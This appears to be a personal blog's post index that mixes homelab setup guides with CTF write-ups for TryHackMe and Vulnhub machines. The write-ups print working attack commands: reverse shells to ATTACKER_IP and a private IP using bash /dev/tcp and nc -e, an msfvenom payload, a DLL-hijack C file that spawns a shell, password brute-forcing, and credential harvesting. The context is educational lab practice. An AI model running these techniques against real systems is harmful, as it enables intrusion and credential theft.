notification. Select add a new forest. Name it how you want. Keep going till you get to the prereq checks (ignore the DNS error). it should all pass and their will be a few errors however ultimately it should let you install. Once rebooted you now have a DNS and active directory domain controller! Next i will be going over how i configured them and connecting both a windows 10 and windows 11 systems to the domain in a later post." }, { "title": "Proxmox Install", "url": "/posts/proxmox-install/", "categories": "homelab, software", "tags": "proxmox, hosting, servers", "date": "2022-08-11 12:00:00 -0700", "snippet": "Proxmox InstallReasonAs discussed in my Homelab post as many who want to start off with homelab, money is an issue. therefore virtualization is our best friend. After trying out different hypervisors such as hyper-v and vmware’s ESXI. I settled on Proxmox due to its prevelence in the homelab space and its ease of use. main reason is that it is free lol.Overviewfor this instillation i will be using it to virtualize my entire homelab and have the option to expand with other nodes if needed. I wanted to be able to simulate enterprise networks with no worries about breaking systems due to snapshots and easily expand if needed.Instilation download the ISO from Proxmox website select either the direct download or Torrent. now using the software of your choosing burn the ISO to a thumb drive. personaly i like balena etcher or simply dd or cat in linux when internet is not available plug in your ethernet cable at this point. it will save time with some of the network setup later. now after booting into Proxmox we begin by seting up which drive we want our install to go to personaly i used an nvme ssd for my inernal boot disk. keep in mind that the drive you use for the install will also house the backups and Disk images in the future. next we will select the timezone and location for the server. this will keep track of the system time. after this we will setup the administrator account credentials. you will setup a root password along with providing a valid email for support services if you want and for alerts from the server. now we are at one of the most important steps, networking. now if you have pluged in an ethernet cable before booting it should populate automaticaly with a gateway address now chose the management interface you would like to use. i.e. the ethernet port that is giving internet to your system for the hostname chose what you want. for my homelab i have no need for a public domain name here so i setup a private one. for the ip address it should auto populate if connected to a DHCP server, or simply your router. if not, manualy imput an ip within the address range of your DHCP server. for the gateway, again it should auto populate. if not then see your router/DHCP to what its ip is. for DNS you can point this to an internal dns if you have it previously setup or you can use other public DNS servers. personaly i like cloudflare’s DNS of : 1.1.1.1 now procced through the instillation and reboot.Conclusiononce rebooted procede to the web interface on ( https://IP-of-machine:8006 )Congradulations! you know have a full up hypervisor setup for your cheap homelab needs!" }, { "title": "PFSense Install", "url": "/posts/pfsense-install/", "categories": "homelab, software", "tags": "networking, pfsense, hosting", "date": "2022-08-11 12:00:00 -0700", "snippet": "PFSense InstallReasonI wanted to have my home network segregated so that I wont have to worry about any other devices interfeering or my home network going down when I am tinkering ( those of you with wives will understand… )Overviewhere i will be covering the install of PFSense on Proxmox and not the installation of proxmox its self. please see my Proxmox Install before i begin i will say that my situation is less than ideal but if their is a will their is a way!I deciede due to limited funds and spare hardware I would be virtualizing this in proxmox and using it as the main router for my homelab both VMs and Hardware. Doing this was not difficult at all. best part if a config I make bricks it i have snapshots for a simple and easy restore to my last good configs. keeping my network uptime as high as possible. enough of the semantics lets get to the bread and butter!Installation First things first you will need the ISO. Go to PFSense and download it. ensure to set the installer to DVD Image (ISO) Installer. now upload the ISO to Proxmox Follow the guide given by PFSense for instilation with Proxmox for a working standard. given my special situation with how i need to setup my network highlighted here I needed to make a few adjustments. For my specific setup instead of using an ethernet NIC to add ports for the device. All i had was a spare gigabit usb ethernet adapter. setup is the same as the given instructions however i needed to use the ethernet port on the MotherBoard for both proxmox and the wan of the PFSense VM. so when going through the setup instead of setting up both vmbr1 &amp; 2 i only create vmbr1 using the ethernet dongle as the port i had to ensure that the bridge ports section states my ethernet adapters name located under the network tab for proxmox now unlike the instructions provided by PFSense for installation i used vmbr0 as the WAN and vmbr1 for the LAN. the reason why is so that i have a seperate virtualized router that is still able to provide outside internet to the VMs behind it. this way i can still manage it over my ISP provided router along with internaly via the VMs or hardlined to the VM.Physical Accessto connect my real devices to the network I used vmbr1 to connect to an 8 port managed switch. this will be used for future expansion when needed.Conclusionthats pretty much it! while using the same port proxmox is using for internet is not best practice in a pinch its working for my situation until i can build a dedicated PFSense machine.Thank you for reading!" }, { "title": "My Homelab", "url": "/posts/homelab/", "categories": "homelab, hardware", "tags": "servers, hosting", "date": "2022-08-06 20:46:13 -0700", "snippet": "My HomelabReasonThe reason I decided that I needed to have a homelab is for fun! Thats the real answer. but my corprate answer would be so I can get hands on with many different technologies and put my skills to the test.How I startedNot having a lot of money for an actual server to work with I took bits and pieces from old desktop parts I had lying around, and parts given to me by friends that had upgraded their gaming PC’s. all together I was able to get a decent starting system together.SpecsCPU Intel Quad Core i5-6500 @ 3.2 GHzRAM 2x DDR4 Corsair vengeance (2 x 8GB) 1x DDR4 Ballistics (1 x 8GB) 1x DDR4 Unnamed Chinese knockoff ram (1 x 8GB) 32GB TotalStorage 2TB crucial ssd 1TB WD blue x 2 512GB WD M.2 SSD 128GB Kingston M.2 SSDGraphics Card MSI Radeon R9 390xMother Board gigabyte ( cant remember the name )Networkingthey way my network will be handled will be unorthodox and not ideal at all, but given limited resources and funds. gotta think a little outside the box.as you can see im needing to use a wireless extender to give a “Wired” connection to my proxmox server. now i could go about it multiple ways such as running ethernet in the wall or across the house in the open to get from one room to another. Or i could even use Powerline adapters to do the same and be more reliable than a cheap little wireless extender. I would highly recomend doing it a different way than me for much less of a headache.What will be doneThis is now the 3rd rendition of this lab, and I have narrowed it down to the few essentials I want added.To start I would like to have a NAS, and a media server. While looking at different solutions I found 2 options I wanted to try out. For the NAS I wanted to try out TrueNAS. Seeing all the videos and reviews it seemed like a fantastic option. For the Media Server I wanted to use Plex since I have used it in the past, and it has a great user interface.Now having only 1 PC I needed a way to have VMs other than Virtualbox and able to use a minimal amount of the resources available. I looked at different options such as ESXI, Windows Hyper V, and such, but they all used to much of my resources or “cost me money!” (As Mr. Crabs would say). With this I settled on Proxmox. It ticked all my boxes, and came recomended by alot of other homelabers.The ProcessThe steps I took consisted of the following: Install Proxmox Install TrueNAS Install PlexSeams simple. Lets Begin.I started by getting the Proxmox iso and burning it to a USB. installed proxmox onto my makeshift server by going into the bios and setting the boot order to have it boot from the USB drive first. Once booted I went through the instilation wizard and made the 128GB SSD the boot drive.After install I went to the web portal to mangage it at 192.168.0.181:8006 for me. Logged in and added the rest of the drives to the system under the names: 2TB_SSD 1TB_WD 1TB_WD_USB 512GB_NVMENow I needed to upload the ISOs I wanted to install.At first I thought I would need to install plex in a docker container however, I found out that you can install and host plex from TrueNAS!So I created a TrueNAS VM on the 512GB giving it: 2 cpu cores 16gb ram (I know its overkill but I want to eventualy increase storage 32gb allocated from the 512GB for the VM add all the TB drives as storage for itOnce booted I created 2 seprate ZFS pools. media (2TB_SSD used for my videos and movies ) main (1TB_WD, 1TB_WD_USB used for my genaric files and other stuff )I then went to the plugins and added plex from the ixsystems repo instead of community. I connected the media drive to the plex server loaded with all my movies and shows, formated to be shown.Now when I browse to the IP of the Plex machine I can see all my movies!" }, { "title": "Vulnhub/TryHackMe Mr. Robot", "url": "/posts/mr-robot/", "categories": "ctf, tryhackme", "tags": "hacking, writeup, linux, web", "date": "2022-06-24 12:00:00 -0700", "snippet": "Mr. Robot - vulnhubFlag 1As always I start with nmap and gobuster.nmap -sC -sV -oN nmap/initial $IPgobuster dir -u http://$IP -w wordlist.txt -x .cgi,.txt,.php,.html,.py,.sh,.jpg,.png -t 200by enumerating the website and going tohttp://&lt;box ip&gt;/robot.it shows that their is a file called ‘key-1-of-3.txt’. if you browse to ityou will be given the first flag073403c8a58a1f80d943455fb30724b9Flag 2This one was complicated for me.So after finding the first flag in /robots their was also a file called fsocity.dic. I pulled that file with curl and then sorted it out with sort and filtered it down using uniq to bring down the amount of repeats in the dictionary.curl -o fsocity.dic http://$IP/fsocity.dicsort fsocity.dic | uniqYou can also just dosort -u fsocity.dicI then went to the /wp-login found when enumerating and used hydra to enumerate the logon process with the username being elliot.hydra -l elliot -P wordlist.txt $IPI found the username by guesswork but could be found with hydra as well using the fsocity.dic that we sorted out.After finding the password for the account elliot, we see that it is an admin account. Ngl I was stumped for a minute trying to find out how to exploit wordpress. I went down multiple rabbit holes like : exploiting xmlrpc.php, or trying LFI’s and other related CVE’s. I then conceited and peeked at a writeup and saw a few different ways people progressed. Trying to get a hold of a shell was a pain. Some of the methods just did not work. I tried adding a php reverse shell via templates. both making my own and editing the 404 template didn’t work. then I ultimately found out I can use a plugin to access a webshell (which I now learned is very tedious to use. might make a tool to interface with it:) After gaining access through the plugin and navigating to it. I learned I can move throughout directories and that i can execute commands.I used a bash reverse shell and caught it with netcat.bash -i &gt;&amp; /dev/tcp/10.10.10.10/8080 0&gt;&amp;1nc -lnvvp 8080I then searched for different files and saw the flag. however I could not read it. I would need to be a different user to access it. In the same directory as the flag was a password that was an md5 hash of the password of a user robot. I cracked the hash using john the ripper and tried to log in as the robot user, however I needed to be in an actual terminal so I stabilized the shell with pythonpython3 -c 'import pty; pty.spawn(\"/bin/bash\")'export TERM=xtermand logged in as robot. then I read the flag file.822c73956184f694993bede3eb39f959Flag 3Now that we have access to the system lets try and escalate to root.To do so lets enumerate the system. Now i did this by hand butIi also could have imported linpeas or linenum to do this for me. I tried:sudo -lps auxfind / -perm 4000 -exec rootnothing, I then started researching and noticed others add a “w” to the ps aux I did before.So I tried it and saw a few processes running and noticed nmap. I then went to gtfobins and tried –interactive and !su. IM ROOT!!! Now I navigated to /root and saw the 3rd flag. cat it out and bam.04787ddef27c3dee1ee161b21670b4e4and so concludes the mr robot ctf from vulnhub! I had done this before I knew it was also ported to TryHackMe and it was the same for their too" }, { "title": "THM Windows PrivEsc 2022", "url": "/posts/win-privesc/", "categories": "tryhackme, ctf", "tags": "writeup, hacking, windows", "date": "2022-06-20 12:00:00 -0700", "snippet": "Windows Privlage Escelation Writeup Write-up by B4ndw1d7h * First off I want to thank tryhackme and munra for the amazing room. it was really engaging and challenging (especially if you have never done windows privesc before). any who lets start.(tips*)do all the tasks from cmd not powershell(i know its not as user friendly but its the only way i got them to work properly throughout the room)the only thing i would use powershell for is retrieving a file from the attacker box with wgetBox 1task 3Powershell history Start the machine Open the command prompt (cmd.exe) Follow steps in tasktype %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txtHere you will find the answer to the first task.Saved Windows CredsIn the Command prompt (cmd.exe) follow steps in task.Enter the first command this will see if their are any saved creds on the system.cmdkey /listYou should see another user mike.katz.Try to see if you can access a terminal as this user.runas /savecred /user:mike.katz cmd.exeThis should open a command prompt as the user mike.katz. On the users desktop will be the 3rd answer.IIS ConfigAgain follow the task and enter the command.type C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\web.config | findstr connectionStringYou should see in the given text the 2nd answer.Retrieve Creds from Software:PuTTYFor this one I had trouble running the command in both cmd and powershell due to the query made in the task missing the last file to access the credentialsthe way I solved this was to open Registry Editor and navigate to the location specified in the taskHKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\Once there I saw that their is one more file I needed to go into in order to retrieve the answer.Now you can either look for the “ProxyPassword” manually or just add the directory to the end of your command and retrieve the last answer.reg query HKEY_CURRENT_USER\\Software\\SimonTatham\\PuTTY\\Sessions\\My%20ssh%20server /f \"ProxyPassword\" /stask 4Scheduled tasksThis one I had a bit of trouble getting the reverse shell to run.Instead of usingecho C:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\\tasks\\schtask.batusenotepad C:\\tasks\\schtask.batYou will need to manually open “schtask.bat” in notepad and type the reverse shell in otherwise it will consistently give you an error and wont execute.C:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\\tasks\\schtask.batNow setup a listener on the attack box.nc -lvp 4444Make sure you run the task in Command prompt as well.schtasks /run /tn vulntaskNow you should have a shell. the flag will be in taskusr1’s desktop.task 5Insecure permissions on service executableHere it is pretty strait forward. This will have you primarily use msfvenom to craft a reverse shell payload to get your shell.On your attack box craft your payload with this.msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe(you can use this over the rest of the task)Get this on the target however you choose. I like python so I usedpython3 -m http.serverOn the target machine I used wget in powershell to retrieve the file.wget http://ATTACK_BOX_IP:8000/rev-svc.exe -O rev-svc.exeMake a copy of “rev-svc.exe“(to make the rest of the task easier)cd to the services directorycd C:\\PROGRA~2\\SYSTEM~1\\Now change the name of the service we wantmove WService.exe WService.exe.bkpand change the name of one of our “rev-svc.exe” to the service name.move C:\\Users\\thm-unpriv\\rev-svc.exe WService.exeNow grant full permissions to the file as well.icacls WService.exe /grant Everyone:FOpen a listener on your attack box.nc -lvp 4445Now stop and start the service on the windows box.sc stop windowsschedulersc start windowsschedulerYou should now have a shell. The flag is in svcusr1 desktop.unquoted service pathsFor this we will be exploiting the “disk sorter enterprise” service.Read through the task to better understand what we will be doing.Now to solve the problem we will copy the payload we just made “rev-svc.exe” and use one of them as our reverse shell instead of making another.Now move the payload to the “MyPrograms” directory under the name Disk.exe.move C:\\Users\\thm-unpriv\\rev-svc.exe C:\\MyPrograms\\Disk.exeand give it full permissions.icacls C:\\MyPrograms\\Disk.exe /grant Everyone:FNow setup your listener.nc -lvp 4445Now like before stop and start the service.sc stop \"disk sorter enterprise\" sc start \"disk sorter enterprise\"You should now have a shell. The flag is in svcusr2’s desktop.insecure service permissionsHere we will do the same as the last 2 with a bit of a twist.Take our last “rev-svc.exe” and give it full permissions.icacls C:\\Users\\thm-unpriv\\rev-svc3.exe /grant Everyone:FNow we will change the service’s associated executable and account.sc config THMService binPath= \"C:\\Users\\thm-unpriv\\rev-svc.exe\" obj= LocalSystemNow we can stop and start the service.sc stop THMService sc start THMServiceYou now should have a shell. The flag is in the admin’s desktop.task 6Here you will need to access the machine with RDP so if your on windows you have it already if you are on Linux use “Remmina” it is already on the attack box. (if it asks for a password ignore it and continue).Once connected start following the task.Here you have 3 routes you could take to get a shell and get the flag however the one I used was the 2nd option. (I couldn’t get the 1st to work. however the 2nd really emphasizes “Ease of Access”)so starting with the second optionSeTakeOwnershipWe will be attacking the “Ease of Access” prompt when you are at the lock screen.If you follow the task you see that the prompt is just an application run by system when used. “utilman.exe”So first thing we will do to exploit this is take ownership of the utilman.exe.takeown /f C:\\Windows\\System32\\Utilman.exeNow like the other tasks give it full permissions.icacls C:\\Windows\\System32\\Utilman.exe /grant THMTakeOwnership:FNow we will simply rename the cmd.exe executable to utilman.exe and lock the screen.(Follow the instructions on the task)copy cmd.exe utilman.exeNow hit the “Ease of Access” button and bam shell.The flag is in the admins desktoptask 7DLL high-jackingThis one was giving me a bit of an issue when it came to crafting the payload, but don’t worry you’ll see the syntax needed.So start again by reading the task (the info is always helpful to understand).It started getting a bit hard for me to understand ( English not being my first language) but the simple rundown is this.Go to the location of the VNC Server application.C:\\Programfiles\\RealVNC\\VNC Server\\Copy the contents to this folder. no need to rename anything.C:\\Users\\thm-unpriv\\AppData\\Local\\Temp\\Now on your attack box in the share directory create a proxy.c file and a get_exports.py file.touch proxy.ctouch get_exports.pyIn the proxy.c file paste this#include &lt;windows.h&gt;BOOL WINAPI DllMain(HMODULE hinstDLL, DWORD fdwReason, LPVOID lpvReserved){ if (fdwReason == DLL_PROCESS_ATTACH) {  system('C:\\\\tools\\\\nc64.exe -e cmd.exe ATTACKER_IP 6666'); } return TRUE;}In the get_exports.py paste thisimport pefileimport argparseparser = argparse.ArgumentParser(description='Target DLL.')parser.add_argument('--target', required=True, type=str,help='Target DLL')parser.add_argument('--originalPath', required=True, type=str,help='Original DLL path')args = parser.parse_args()target = args.targetoriginal_path = args.originalPath.replace('\\\\','/')dll = pefile.PE(target)print(\"EXPORTS\", end=\"\\r\\n\")for export in dll.DIRECTORY_ENTRY_EXPORT.symbols: if export.name: print(f\" {export.name.decode()}={original_path}.{export.name.decode()} @{export.ordinal}\", end=\"\\r\\n\")Now go back to your home folder and run the smbserver again like we did in the last task./opt/impacket/examples/smbserver.py -smb2support -username thm-unpriv -password Password321 public shareHop on the windows box and copy over the adsldpc.dll to your attack box.copy C:\\Windows\\System32\\adsldpc.dll \\\\ATTACKER_IP\\public\\Now the dll should be in your share folder.cd into the share folder and run the get_exports.py script with the following arguments.python3 get_exports.py --target adsldpc.dll --originalPath 'C:\\Windows\\System32\\adsldpc.dll' &gt; proxy.defNow we will compile a new dll (again I recomend using the attack box as it already has the required packages). We will run this first to output a proxy.o file x86_64-w64-mingw32-gcc -m64 -c -Os proxy.c -Wall -shared -masm=intel Then compile the .o and .def files to the .dll x86_64-w64-mingw32-gcc -shared -m64 -def proxy.def proxy.o -o proxy.dll Now get the proxy.dll onto the windows box however you like again I used python. and move it to the temp directory under the name adsldpc.dllmove proxy.dll C:\\Users\\thm-unpriv\\AppData\\Local\\Temp\\adsldpc.dllNow to trigger the repair process open system settings -&gt; apps -&gt; apps &amp; features, and scroll down to VNC Server.Hop to your attack box and start up a listener on port 6666 (the payload we put in the proxy.c file)nc -lvp 6666now go back to the windows box and press modify -&gt; repair -&gt; repair, and you should get a shell. The flag is on the admin’s desktop.ConclusionThis was a really great room as a beginner even with the little hick-ups I had regarding my own lack of knowledge in windows privesc. As a starting point I cant thank tryhackme and munra enough for the great revamp of the room!" }, { "title": "Vulnhub Momentum 1 Writeup", "url": "/posts/momentum-1/", "categories": "ctf", "tags": "hacking, writeup, web, linux", "date": "2022-05-24 12:00:00 -0700", "snippet": "Momentum 1First i started off with a network scan to obtain the IP and services of the boxnmap $IP/24nmap -sC -sV -oN nmap/initial $IPonce done i see that their is an ssh port and an http port open on the boxseeing that it is a webserver i decided to start my enumeration to see if their are any extra pages i might miss.gobuster dir -u http://$IP/ -w ~/path/to/wordlist.txtlooking through the output i see nothing useful so i go digging in the webpage with inspect element.while looking through the files and what happens when reloaded i look at the source code of the site. along with the js files and css.in the js file i notice thisfunction viewDetails(str) { window.location.href = \"opus-details.php?id=\"+str;}/*var CryptoJS = require(\"crypto-js\");var decrypted = CryptoJS.AES.decrypt(encrypted, \"SecretPassphraseMomentum\");console.log(decrypted.toString(CryptoJS.enc.Utf8));*/having just recently started looking at Javascript i see that their is another webpage that my enumeration couldnt find.i emediatly take the bit of url their and past it into the url of the site.in doing so i see that whatever i put down in the id= field will be displayed on the webpage. again having just recently started messing with XSS i go and try to exicute an alert and it worked.( pretty simple )i tried multiple different things such as: a remote shell (didnt work), LFI (didnt work), even some DB scripts, and nothing. then while doing some research i saw that most people when given a cookie try stuff with that.so i went and looked at the cookie in inspect-element -&gt; application -&gt; cookie or by causing the page to execute&lt;script&gt; alert(document.cookie)&lt;/script&gt;it looked to be encrypted and with the info the js file gave me i figured it was using crypto-js with AES to encrypt it. so i looked online for a decoder and found one here that was able to decrypt it for me.it needed the password in order to decrypt which i saw in the js file that it was ” SecretPassphraseMomentum “which in turn gave me this as the text ” auxerre-alienum## “now with this i figured with the ssh port open it might be a password but what would i use as the username and password?given the decrypted passphrase i figured it had to be some permutation of it so i made a [[passphrase.txt|wordlist]] to bruteforce it with hydra.hydra -L wordlist.txt -P wordlist.txt &lt;IP of target&gt; sshand bam i got the username and password[22][ssh] host: &lt;ip&gt; login: auxerre password: auxerre-alienum##so i ssh’d in with the credentialsssh auxerre@&lt;ip&gt;auxerree@&lt;ip&gt; password: auxerre-alienum##once in i see a user.txt i cat it out and[ Momentum - User Owned ]---------------------------------------flag : 84157165c30ad34d18945b647ec7f647---------------------------------------First flag!!!now to get root.i imported [[linpeas.sh|linpeas]] to autoenumerate and found that their was an open port on 6379 listening on localhost.after a little research i see that it is a [[6379-pentesting-redis|redis]] instance and that it potentialy could be used as a privesc vector.looking at the documentation on what commands to do to log in i found out i can just useredis-cliand then similar to a ftp connection i can find info in the instance. using the commandkeys *i see that their is a key called rootpassand so iget rootpassand i recieved this stringm0mentum-al1enum##i then logged in as root with the passwordsu root Password: m0mentum-al1enum##once logged in i cat root.txt in /root and get[ Momentum - Rooted ]---------------------------------------Flag : 658ff660fdac0b079ea78238e5996e40---------------------------------------by alienum with &lt;3i now have the final flag!!" }, { "title": "THM Vulnversity Writeup", "url": "/posts/vulnversity/", "categories": "tryhackme, ctf", "tags": "writeup, hacking, web, linux", "date": "2022-05-20 12:00:00 -0700", "snippet": "Vulnversity write-upTaskRecon\tuse nmap to solvenmap -sV -n $IPDirectory traversal\tuse gobuster to solvegobuster dir -u http://$IP:3333 -w /path/to/wordlistCompromise web-server\tuse burpsuite to solve Steps go to proxy tab click open browser navigate to http://$IP:3333/internal/ turn intercept on try to upload a [[SecLists/Web-Shells/laudanum-0.8/php/php-reverse-shell.php php-reverse-shell]] in the request change the file extetion to .phtml forward the request in a terminal set up a listener nc -lnvp 1234 now navigate to http://$IP:3333/internal/uploads/php-reverse-shell.phtml go to your terminal and see you have a shell now stabilize the shell with python python -c 'import pty; pty.spawn(\"/bin/bash\")' export a terminal export TERM=xterm now view the home directory to get an answer cat out the flag.txt for the next answer Privlage Escalation\tthis one was simple but i’m an idiot Steps enumerate the system when checking SUIDs find them with this find / -perm -4000 2&gt;/dev/null you’ll see systemctl is usefull check out GTFOBins change the “id &gt; /tmp/output” to a reverse shell or just have it cat the next flag Don’t make it one line, it will be a formatting error for systemctl !! go to /root/ and read root.txt for the final flag " }, { "title": "Vulnhub Aragog", "url": "/posts/aragog/", "categories": "ctf", "tags": "hacking, writeup, web, linux", "date": "2022-05-19 12:00:00 -0700", "snippet": "AragogI started off like I always do and ran nmap and gobuster.We find that port 80 is open from nmap and found /blog from gobuster.upon viewing this we see that its wordpress.seeing this I try wpscan.\tnothingI ran wordpress_scanner in msfconsolefound wp_file_manager v6.0used CVE found on the internet for this version to exploit.uploaded reverse shell in php.connection esstablishedfound first flag in home folder for user hagrid98used linpeas to enumeratefound thisdefine('DB_PASSWORD', 'mySecr3tPass');define('DB_USER', 'root');in php filesalong with a backup.sh file in /optlogged into database usingmysql -u root -pmySecr3tPass wordpressthen looked at what was there with SHOW TABLES;found a wp_users tableSHOW * FROM wp_usersand got the hash for the wp_admin hagrid| 1 | hagrid98 | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin | hagrid98@localhost.local |the hash was a phpass hashpasword for hagrid98 is : password123i logged in as hagrid98uploaded pspy to see if any background processes are running and saw that backup.sh is run by root every so often and as hagrid i can edit iti added a bash reverse shell and once root ran it bam im root and got the 2nd flag in /root" }, { "title": "Vulnhub Infosec-OSCP", "url": "/posts/infosec-oscp/", "categories": "ctf", "tags": "hacking, writeup, web, linux", "date": "2022-05-16 12:00:00 -0700", "snippet": "Infosec OSCP BoxThis box was pretty simple to solve. The only issue I ran into was Privesc but that is do to my inexperience.First things first I start with an nmap scan to see what ports are open, along with gobuster just in-case to start the enumeration.nmap -sC -sV -oN nmap/initial $IPgobuster dir -u http://$IP -w wordlist.txt -x .cgi,.txt,.php,.html,.py,.sh,.jpg,.png -t 200During the enumeration I see a robots.txt and see /secret.txt.I go to it and find a base64 encoded string.I decode it and get an openssh private key.base64 -d encoded.txt &gt; decode.txti then use the key to access the box with the user “oscp” that is called out in the main page of the website.once in i immediately upload linpeas for my enumeration.python3 -m http.serverI see that the SUID bit is set on /usr/bin/bash. That’s my way in.I then go to GTFObins and see all I need to do is use -p and I’m root(kinda embarrassing lol).I then navigate to the /root dir and cat out the flag." }, { "title": "Nellis AFB InfoSec CTF", "url": "/posts/nellis-infosec-ctf/", "categories": "ctf", "tags": "network, snmp, web, hacking, linux", "date": "2022-04-29 12:00:00 -0700", "snippet": "Nellis AFB InfoSec CTF 20220429“Attack &amp; Respond”Write-up writen by B4ndw1d7h. First Task You will have two hours to break into servers of a fictitious organization. Second Task You will have one and a half hours of responding to a successful data breach by examining packet captures, memory dumps and hard drive images to extract evidence, then answer questions about the breach. Conclusion First to complete all assignments will be the winner. Difficulty Level Intermediate skill level. Materials Needed Laptop Cyber Range environment will be provided by Infosec. Prep Before the CTF I made sure to brush up on these techniques and tools. Metasploit-Framework Navigation and use Nmap Scan types and vulnerability discovery Nikto Web Enumeration GoBuster Web Enumeration John the Ripper Use Burpsuite Use Autopsy Use Searchspoit Use Linux Privlage Escilation Techniques and exploit discovery Windows Privlage Escilation Techniques and exploitdiscovery Linux System Enumeration Manual system enumeration and automated enumerationvia linpeas.sh Windows System Enumeration Manual system enumerationand automated enumerationvia winpeas.exe Network Discovery Nmap scripts and scans Exploitation Metasploit exploitation and delivery methods Resource Gathering Writeups, cheatsheets, and papers of different CTFs and CVE discoveries. TryHackMe For general practice CTF Time!!! Note All IP addresses, URLs, and wordlists used chaged for every user so they are intentialy left blankHow it went down: You had to log into a portal on infosec website and sign up for a 7 day free trial download their modified kali box start the ctf challenge 1I unfortunatly didnt get this info until the ctf had started already :(Round 11st challengeFind authoritative dns on a website: this was to see if we knew basic dns recon Solution: I used dig +short NS &lt;website url&gt; to pull up the dns records of the site given to us the flag was the soa of the website we where given 2nd challenge Find domain owner: again similar to the first only the owner Solution: I used dig &lt;website url&gt; ANY to pull up the owners recors of the same site as challenge 1 the flag was the domain of the websites owner 3rd challengeCracking snmp community string: This was new for me. I never heard of onesixtyone before, so I had to google how this one worked. Luckly they had a small course, kind of like tryhackme, on infosec’s site that helped walk you through similar senarios. Solution: I used onesixtyone &lt;target ip&gt; -c &lt;location of wordlist&gt; to find the default community string that was used. Then entered the string as the flag. 4th challengeSNMP cracking/ find what type of ftp server is running on the box: Same as the first. This was new to me, but infosec also had a small course on how this worked as well for me to understand how this worked. Solution: I used snmpwalk -v 2c -c &lt;community string&gt; &lt;target ip&gt; | more to find the process running the ftp server (Filezilla) on the box. Filezilla was the flag. Round 21st challengeInvestigating port services: I felt confident with this section having preped with nmap prior, so this was rather simple for me to grasp. They said there was something on port 12345 and to investigate what it is Solution: I used nmap -p 12345 &lt;website url&gt; to find netbus on port 12345 and determined it is used as a backdoor for a trojan. The flag was backdoor. 2nd challengeService identification: Again simple nmap scanning to find the version of ftp running Solution: I found ftp version and number using nmap’s -sV option durring a scan vsftpd 3.0.2 was the flag3rd challengeGetting first password: Here they wanted us to login to the ftp server using the username=admin Solution: I used metasploit to bruteforce the password to the ftp server using auxiliary/scanner/ftp/ftp_login and used the snmp password list that comes with metasploit password and flag was admin1234th challengeGetting second password: I did not know how to find it and still do not understand how to find the flag. However the competetor next to me found it in a script localy on the system, in a script before he got the 3rd flag XD. He then asked me if I wanted to make a trade deal to show him how I solved the 3rd challenge for the flag here. XD Teamwork makes the dream work! Solution: It was in a script called “backup” deep on boxRound 31st challenge:Web exploitation: They said to skip this section sadly due to server malfunctions :(Round 41st challengeUser privlage: We needed to find a root exicutible file on the system Solution: I used sudo -l to see what the user could run as root and found a script in /usr/bin/scripts/ that ran as root when executed. The flag was in the script. The script just ran other scripts as root.2nd challengeFind a root owned file that the script exicutes: The previous script exicutes multiple random files however one of them we could write to. Solution: The flag was the name of the file3rd final challengeWhat is the root password: After finding the script that root executes with no password needed I simply edited it to give me the root hash from etc/shadow. Solution: I then used john the ripper to crack the hash. After cracking the hash I enterd the password for the flagAnd that was all!!Unfortunatly I only came in second due to not being the first to answer all in the first round and tying on round 2, but it was a great learning experience! Definatly will check out infosec’s courses on new material to learn.We could not do the second portion of the CTF due to time running out however they gave us a pdf to go learn it and do on our own time. The representative unfortunatly said we cannot distribute the info on the second portion." } ]
